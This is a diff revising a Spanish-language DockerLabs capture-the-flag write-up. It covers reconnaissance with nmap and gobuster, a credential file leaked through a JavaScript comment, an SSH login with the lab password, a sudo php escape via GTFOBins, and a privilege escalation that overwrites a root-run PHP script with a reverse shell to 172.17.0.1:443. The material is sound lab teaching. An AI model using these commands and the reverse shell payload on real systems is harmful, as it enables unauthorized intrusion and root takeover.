@@ -2,22 +2,26 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #credential-leak #ssh #dockerlabs
+- Tags: #credential-leak #ssh #sudo-abuse #cron-abuse #reverse-shell
  
 ![](assets/Pasted%20image%2020251108153451.png)
 
 ## Reconocimiento
 
-Empezamos tirando un ping para comprobar conectividad
+Comienzo tirando un ping para comprobar la conectividad.
+
 ```bash
 > ping -c 1 172.17.0.2
-------------------------------------------------------------
--- 172.17.0.2 ping statistics ---
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.315 ms
+
+--- 172.17.0.2 ping statistics ---
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 0.315/0.315/0.315/0.000 ms
 ```
 
-Ahora procedo a tirar un escaneo con nmap para ver que puertos están abierto
+Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.
+
 ```bash
 > sudo nmap -p- --open -sS -Pn -n --min-rate 5000 172.17.0.2
 -----------------------------------------------------------------
@@ -27,11 +31,12 @@ PORT   STATE SERVICE
 MAC Address: 02:30:D5:BE:7C:49 (Unknown)
 ```
 
-- Puerto 80 HTTP y 22 SSH abiertos
+- Puertos 22 y 80 abiertos.
 
-Tiro un segundo escaneo para ver que servicios, y versiones corren en los puertos abiertos
+Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
+
 ```bash
-sudo nmap -p 22,80 -sS -sCV --min-rate 5000 -Pn -n 172.17.0.2 -oN target.txt
+> sudo nmap -p 22,80 -sS -sCV --min-rate 5000 -Pn -n 172.17.0.2 -oN target.txt
 --------------------------------------------------------------------------------
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
@@ -43,27 +48,30 @@ PORT   STATE SERVICE VERSION
 |_http-title: Mi Landing Page - Ciberseguridad
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 MAC Address: 02:30:D5:BE:7C:49 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-- Los servicios que están corriendo son: 
-	- 80 HTTP Apache httpd 2.4.41 ((Ubuntu))
-	- 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+- Puerto 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
+- Puerto 80 HTTP Apache httpd 2.4.41 (Ubuntu)
 
+## Enumeración
 
+### Puerto 80 HTTP
 
+La página principal es una landing page personal sobre ciberseguridad.
 
-### Enumeración
-
-**Puerto 80**
-
-- Es una pagina web de un perrito que esta cabron.
 ![](assets/Pasted%20image%2020251108154912.png)
 
-En su codigo fuente lo mas relevante son los _script.js_
+**Código Fuente.**
+
+Inspeccionando el código fuente encuentro referencias a varios archivos JavaScript.
+
 ![](assets/Pasted%20image%2020251108165633.png)
 
+**Fuzzing de Directorios.**
 
-Procedí a realizar fuzzing para ver que mas podía encontrar
+Utilizo `gobuster` para descubrir posibles recursos en el servidor web.
+
 ```bash
 > gobuster dir -w raft-large-directories.txt -u http://172.17.0.2/ -x html,php,js,txt,py
 ------------------------------------------------------------------------------------------
@@ -78,112 +86,131 @@ Starting gobuster in directory enumeration mode
 /index.html           (Status: 200) [Size: 9487]
 ```
 
-- _script.js_ y _whoami_ es lo que mas me llama la atención
+- Encuentro un directorio `/whoami` y varios archivos JavaScript.
 
 ## Explotación
 
-Le di una leída al _script.js_ y encontré esta parte de codigo:
+### Fuga de Credenciales en script.js
+
+Inspecciono el archivo `script.js` y encuentro un comentario raro.
 
 ```js
-  // Funcionalidad para ocultar/mostrar el header al hacer scroll y el secretito de la web
-    console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji")
-    let lastScrollTop = 0;
-    const header = document.querySelector('header');
-    const delta = 5; // La cantidad mÃ­nima de scroll para ocultar el header
+// Funcionalidad para ocultar/mostrar el header al hacer scroll y el secretito de la web
+console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji")
+let lastScrollTop = 0;
+const header = document.querySelector('header');
+const delta = 5; // La cantidad mínima de scroll para ocultar el header
 ```
 
-- Al parecer existe un archivo llamado .env_de_baluchingon visible que supongo serán credenciales para el ssh.
+El comentario indica que existe un archivo `.env_de_baluchingon` accesible que contiene credenciales de backup.
 
-Lo segundo que me llamo la atención fue el directorio _whoami_
-- Al parecer no tenia nada interesante
-![](assets/Pasted%20image%2020251108160610.png)
+### Acceso al archivo de credenciales
 
-Ahora, sabiendo que existe un archivo visible llamado `.env_de_baluchingon` mi idea era tratar de listarlo en todos los directorios para ver si alguno me lo volcaba. Entonces procedi a listarlo desde la raíz para ver si tenia suerte.
-```bash
+Intento acceder directamente al archivo desde la raíz del servidor web.
+
+```
 http://172.17.0.2/.env_de_baluchingon
 ```
 
-Y al parecer tuve suerte a la primera
+El archivo es accesible y contiene credenciales en texto plano.
+
 ![](assets/Pasted%20image%2020251108160744.png)
 
-Procedo a conectarme mediante `SSH` con las credenciales lekeadas. 
+- Encuentro credenciales: `balu:baluchingon123`
+
+### Acceso SSH
+
+Con las credenciales encontradas, me conecto por SSH.
 
 ```bash
 > ssh balu@172.17.0.2
-```
+balu@172.17.0.2's password: baluchingon123
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)
 
+balu@6cde27e6f35a:~$ whoami
+balu
+balu@6cde27e6f35a:~$ id
+uid=1000(balu) gid=1000(balu) groups=1000(balu)
+```
 
 ## Escalada de Privilegios
 
-Procedo a enumerar binarios con privilegios de SUDO: 
+Dentro del sistema enumero binarios que pueda ejecutar con privilegios elevados.
+
 ```bash
-balu@6cde27e6f35a:~$ ls
 balu@6cde27e6f35a:~$ sudo -l
 ---------------------------------------------------------
 User balu may run the following commands on 6cde27e6f35a:
     (chocolate) NOPASSWD: /usr/bin/php
 ```
 
-- Aquí vemos que existe un binario _php_ que puede ser ejecutado por el usuario chocolate
+- Puedo ejecutar `php` como el usuario `chocolate` sin contraseña.
 
-Por lo cual procedemos a explotar el binario con ayuda de GTFObins
+### Migración al usuario chocolate
+
+Con ayuda de [GTFOBins](https://gtfobins.github.io/gtfobins/php/) abuso del binario `php` para migrar al usuario `chocolate`.
+
 ```bash
 > balu@6cde27e6f35a:~$ sudo -u chocolate /usr/bin/php -r 'system("/bin/bash");'
 chocolate@6cde27e6f35a:/home/balu$ whoami
 chocolate
 ```
 
-Ahora, siendo el usuario chocolate volvimos a listar por binarios pero nos pedía la contraseña de chocolate, la cual no tenemos.
-```bash
-> sudo -l
-Password for chocolate: 
-```
+### Enumeración de procesos
 
-Entonces procedimos a movernos entre directorios hasta que dimos con el directorio /opt
-```
-> chocolate@6cde27e6f35a:/opt$
-```
-
-Aquí fue donde nos encontramos con un archivo llamado `script.php` que podia ser modificado por nuestro usuario chocolate.
+Intento enumerar privilegios sudo como `chocolate`, pero requiere contraseña.
 
 ```bash
-> chocolate@6cde27e6f35a:/opt$ ls -la
+chocolate@6cde27e6f35a:/home/balu$ sudo -l
+[sudo] password for chocolate:
+```
+
+Enumero el sistema en busca de archivos modificables o procesos interesantes. Encuentro un archivo en `/opt` que pertenece a `chocolate`.
+
+```bash
+chocolate@6cde27e6f35a:/opt$ ls -la
 ---------------------------------------------------------
 -rw-r--r-- 1 chocolate chocolate 59 May  7  2024 script.php
 ```
 
-Inspeccionamos el script para ver que hace: 
-- No hace nada interesante
+Inspecciono el contenido del script.
+
 ```php
-> chocolate@6cde27e6f35a:/opt$ cat script.php
+chocolate@6cde27e6f35a:/opt$ cat script.php
 <?php echo 'Script de pruebas en fase de beta testing'; ?>
 ```
 
-Ahora nuestro segundo approach fue listar los proceso que el usuario root estuviera ejecutando y nos encontramos algo interesante
+### Análisis de procesos de root
+
+Enumero los procesos que está ejecutando el usuario root.
+
 ```bash
 chocolate@6cde27e6f35a:/opt$ ps aux | grep root
 --------------------------------------------------
 root   1  0.0  0.0   2616  1428 ? Ss 21:33 0:00 /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done
 ```
 
-- El usuario root esta ejecutando un bucle infinito que a su vez ejecuta el archivo _script.php_
+El usuario root está ejecutando un **bucle infinito** que ejecuta `/opt/script.php` cada 5 segundos. Como tengo permisos de escritura sobre este archivo, puedo modificarlo para ejecutar código arbitrario como root.
 
-Sabiendo esto, básicamente podemos modificar el archivo _script.php_ para mandarnos una reverse shell, gracias a que el usuario root eventualmente va a ejecutar este script.
+### Reverse Shell como root
 
-Primero nos ponemos en escucha:
+Me pongo en escucha en mi máquina atacante.
+
 ```bash
 > sudo nc -nlvp 443
+listening on [any] 443 ...
 ```
 
-Después remplazamos el contenido del script.php
-- Reverse Shell
+Modifico el contenido de `script.php` para incluir una reverse shell en PHP.
+
 ```bash
 chocolate@6cde27e6f35a:/opt$ echo '<?php $sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > /opt/script.php
 chocolate@6cde27e6f35a:/opt$ cat script.php
 <?php $sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
 ```
 
-El usuario root ejecuta el script y nos llega la shell
+Después de esperar unos segundos, el proceso ejecutado por root ejecuta el script modificado y recibo la conexión.
+
 ```bash
 Connection received on 172.17.0.2 48862
 /bin/sh: 0: can't access tty; job control turned off
@@ -191,8 +218,6 @@ Connection received on 172.17.0.2 48862
 root
 # id
 uid=0(root) gid=0(root) groups=0(root)
-# 
 ```
 
-
-***PWNED**
+***PWNED***
